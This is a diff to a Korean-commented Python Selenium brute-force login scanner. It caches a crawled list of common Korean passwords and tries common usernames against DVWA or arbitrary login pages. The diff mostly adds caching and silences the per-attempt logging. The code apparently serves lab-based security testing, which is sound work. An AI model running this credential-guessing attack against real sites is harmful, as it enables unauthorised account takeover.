@@ -6,35 +6,95 @@ from selenium.webdriver.support import expected_conditions as EC
 from brute_force_crawling import get_korean_password_list_with_selenium, url as crawl_url
 import sys
 import time
+import datetime
 from urllib.parse import urlparse, urlunparse
 import random
+import os
+import json
 
 # =========================================================
 # 🌟 Brute Force 스캐너 설정 (데이터 연동) 🌟
 # =========================================================
 
 USERNAME_LIST = ["admin", "user", "test", "root"]
+CACHE_FILE = 'password_crawling_cache.json'  # 🚨 캐시 파일 이름 정의
+CACHE_EXPIRY_DAYS = 3  # 캐시 만료 기간을 3일로 설정
 
 CRAWLED_PASSWORDS = []
 PASSWORD_LIST = []
+
+
+def load_passwords_from_cache():
+    """캐시 파일에서 비밀번호 목록을 로드합니다. (3일 만료 로직 적용)"""
+    if os.path.exists(CACHE_FILE):
+        try:
+            # 1. 파일 수정 시간 확인 및 만료 여부 체크
+            file_mtime = os.path.getmtime(CACHE_FILE)
+            cache_time = datetime.datetime.fromtimestamp(file_mtime)
+
+            # 현재 시간과 캐시 파일 수정 시간의 차이 계산
+            if datetime.datetime.now() - cache_time > datetime.timedelta(days=CACHE_EXPIRY_DAYS):
+                print(f"[INFO] ⚠️ 캐시 파일이 {CACHE_EXPIRY_DAYS}일(3일)이 지나 만료되었습니다. 새로 크롤링합니다.")
+                # 만료된 캐시 파일 삭제 후 None 반환 (크롤링 유도)
+                os.remove(CACHE_FILE)
+                return None
+
+            # 2. 만료되지 않은 경우 로드
+            with open(CACHE_FILE, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+                print(f"[INFO] ✅ 캐시 파일에서 {len(data)}개의 비밀번호를 빠르게 로드했습니다. (만료 전)")
+                return data
+
+        except Exception as e:
+            # 로드 중 오류 발생 시, 캐시 사용 포기
+            print(f"[-] 캐시 파일 로드/만료 확인 오류 ({e}). 새로 크롤링을 시도합니다.")
+            return None
+    return None
+
+
+def save_passwords_to_cache(passwords):
+    """비밀번호 목록을 캐시 파일에 저장합니다."""
+    try:
+        with open(CACHE_FILE, 'w', encoding='utf-8') as f:
+            json.dump(passwords, f, ensure_ascii=False, indent=4)
+        print(f"[INFO] 💾 {len(passwords)}개의 비밀번호를 '{CACHE_FILE}'에 캐시했습니다.")
+    except Exception as e:
+        print(f"[-] 캐시 파일 저장 오류: {e}")
+
+
+# ---------------------------------------------------------
+# 🚨 메인 데이터 로딩 로직 (캐싱 적용)
+# ---------------------------------------------------------
 try:
-    CRAWLED_PASSWORDS = get_korean_password_list_with_selenium(crawl_url)
+    # 1. 캐시 시도
+    cached_passwords = load_passwords_from_cache()
+
+    if cached_passwords:
+        CRAWLED_PASSWORDS = cached_passwords
+    else:
+        # 2. 캐시 실패/없음: 크롤링 진행
+        print("[INFO] 🌐 캐시 파일 없음. 크롤링을 시작합니다. (시간 소요)")
+        CRAWLED_PASSWORDS = get_korean_password_list_with_selenium(crawl_url)
+
+        if CRAWLED_PASSWORDS:
+            # 3. 크롤링 성공 시 캐시 저장
+            save_passwords_to_cache(CRAWLED_PASSWORDS)
+        else:
+            print("[-] 크롤링에 실패했습니다. 기본 목록도 사용하지 않고 종료합니다.")
 
     if CRAWLED_PASSWORDS:
-        # 크롤링된 목록의 순위를 존중하며 중복 제거
+        # 최종 PASSWORD_LIST 구성 (중복 제거)
         unique_passwords = []
         for p in CRAWLED_PASSWORDS:
             if p not in unique_passwords:
                 unique_passwords.append(p)
-
         PASSWORD_LIST = unique_passwords
     else:
-        # 크롤링 실패 시 빈 리스트로 초기화 (아래 main 함수에서 즉시 종료)
-        PASSWORD_LIST = []
+        PASSWORD_LIST = []  # 크롤링 실패 시 빈 목록 유지
 
-except Exception:
+except Exception as e:
+    print(f"[-] 초기 데이터 로딩 중 치명적인 오류 발생: {e}")
     PASSWORD_LIST = []
-
 
 # 🚨 [오류 해결] DVWA 및 일반 웹사이트의 성공/실패 지표를 명확히 분리 정의합니다.
 # DVWA 지표
@@ -65,7 +125,8 @@ def perform_dvwa_login_and_setup(driver, base_url):
     LOGIN_URL = base_url + "login.php"
     SECURITY_URL = base_url + "security.php"
 
-    print(f"\n[STEP 1] DVWA 접속 및 관리자 로그인 시도...")
+    # 로그인시도 주석
+    # print(f"\nDVWA 접속 및 관리자 로그인 시도...")
     driver.get(LOGIN_URL)
 
     try:
@@ -79,7 +140,7 @@ def perform_dvwa_login_and_setup(driver, base_url):
         time.sleep(2)
 
         if "Logout" in driver.page_source:
-            print("✅ 초기 로그인 성공 (admin/password)! 세션 확보.")
+            # print("✅ 초기 로그인 성공 (admin/password)! 세션 확보.")
 
             driver.get(SECURITY_URL)
             time.sleep(2)
@@ -91,7 +152,7 @@ def perform_dvwa_login_and_setup(driver, base_url):
             submit_button.click()
             time.sleep(2)
 
-            print("✅ 보안 레벨 'Low' 설정 완료.")
+            # print("✅ 보안 레벨 'Low' 설정 완료.")
             return True
         else:
             print("❌ 초기 로그인 실패. admin/password 또는 DVWA 상태를 확인하세요.")
@@ -106,7 +167,7 @@ def scan_brute_force_with_selenium(driver, target_url, is_dvwa):
     vulnerabilities = []
     wait = WebDriverWait(driver, 15)
 
-    # 🚨 NameError 해결: is_dvwa 여부에 따라 정의된 지표를 정확히 선택합니다.
+    # is_dvwa 여부에 따라 정의된 지표를 정확히 선택합니다.
     success_indicators = DVWA_SUCCESS_INDICATORS if is_dvwa else GENERIC_SUCCESS_INDICATORS
     failure_indicators = DVWA_FAILURE_INDICATORS if is_dvwa else GENERIC_FAILURE_INDICATORS
 
@@ -115,12 +176,12 @@ def scan_brute_force_with_selenium(driver, target_url, is_dvwa):
 
     passwords_to_attempt = PASSWORD_LIST[:20]
 
-    print(f"\n[STEP 2] {target_url} 페이지로 이동하여 스캔 시작...")
+    print(f"\n{target_url} 페이지로 이동하여 스캔 시작...")
     driver.get(target_url)
 
     total_attempts = len(shuffled_usernames) * len(passwords_to_attempt)
-    print(f"[+] Brute Force 공격 시작: 총 {total_attempts}가지 조합으로 정답을 찾습니다.")
-    print(f"[INFO] ID 시도 순서: {', '.join(shuffled_usernames)}")
+    print(f"[+] Brute Force 스캔 시작: 총 {total_attempts}가지 조합으로 정답을 찾습니다.")
+    print(f"[INFO] ID 리스트와 비밀번호 리스트로 로그인 시도") #순서: {', '.join(shuffled_usernames)}"
 
     USER_FIELD = (By.NAME, "username")
     PASS_FIELD = (By.NAME, "password")
@@ -129,7 +190,8 @@ def scan_brute_force_with_selenium(driver, target_url, is_dvwa):
     for user in shuffled_usernames:
         for passwd in passwords_to_attempt:
 
-            print(f"  [ATTEMPT] ID='{user}', PW='{passwd}' 시도 중...")
+            # 🚨 [주석 처리 대상 1] 시도 시작 알림 (선택 사항)
+            # print(f"  [ATTEMPT] ID='{user}', PW='{passwd}' 시도 중...")
 
             try:
                 username_input = wait.until(EC.presence_of_element_located(USER_FIELD))
@@ -164,11 +226,16 @@ def scan_brute_force_with_selenium(driver, target_url, is_dvwa):
                 print(f"🎉 **[SUCCESS]** ID='{user}', PW='{passwd}' - 로그인 성공! 취약점 발견!")
                 return vulnerabilities
 
+
             elif is_failure:
-                print(f"  [FAIL] ID='{user}', PW='{passwd}' -> 비밀번호 불일치")
+                # 🚨 [주석 처리 대상 2] 실패 알림
+                # print(f"  [FAIL] ID='{user}', PW='{passwd}' -> 비밀번호 불일치")
+                pass   # print를 주석 처리했으므로 pass를 넣어 문법 오류 방지
 
             else:
-                print(f"  [INFO] ID='{user}', PW='{passwd}' -> 응답 모호 (계속 시도)")
+                # 🚨 [주석 처리 대상 3] 모호 알림
+                # print(f"  [INFO] ID='{user}', PW='{passwd}' -> 응답 모호 (계속 시도)")
+                pass  # # print를 주석 처리했으므로 pass를 넣어 문법 오류 방지
 
     return vulnerabilities
 
@@ -197,7 +264,7 @@ def print_password_list(password_list, source_url):
         print('  ' + ' | '.join(line))
         current_index = end_index
 
-    print(f"\n출처 : {source_url}")
+    print(f"\n비밀번호 출처 : {source_url}")
     print("-------------------------------------")
 
 
@@ -230,7 +297,7 @@ def main():
         is_dvwa = "/dvwa/" in full_url.lower()
 
         if is_dvwa:
-            print("\n[INFO] DVWA 환경을 감지했습니다. 초기 로그인 및 보안 레벨 설정을 시작합니다.")
+            # print("\n[INFO] DVWA 환경을 감지했습니다. 초기 로그인 및 보안 레벨 설정을 시작합니다.")
 
             parsed_url = urlparse(full_url)
             path_segments = parsed_url.path.split('/')
@@ -261,10 +328,13 @@ def main():
         print(f"\n🚨🚨 **Brute Force 취약점 징후가 발견되었습니다.** 🚨🚨")
         for vuln in results:
             print(f"  - **취약점 있음**: {vuln.get('details', 'N/A')}")
-            print(f"  - **권고 사항**: 사전/무차별 대입 공격에 취약합니다. 비밀번호 복잡성 강화 및 Rate Limiting을 적용해야 합니다.")
+            print(f"  - **권고 사항**: 사전/무차별 대입 공격에 취약합니다.")
     else:
         print("\n🎉 Brute Force 취약점 징후가 발견되지 않았습니다. (목록의 비밀번호가 정답이 아님)")
 
 
 if __name__ == '__main__':
     main()
+
+# brute_force 취약점 스캐너 코드의 단점 username 과 password 로만 찾음
+# 여러 웹들중에서 input 하는 코드들이 너무 많기 때문에 찾는 특정 변수 명 정해줘야됨
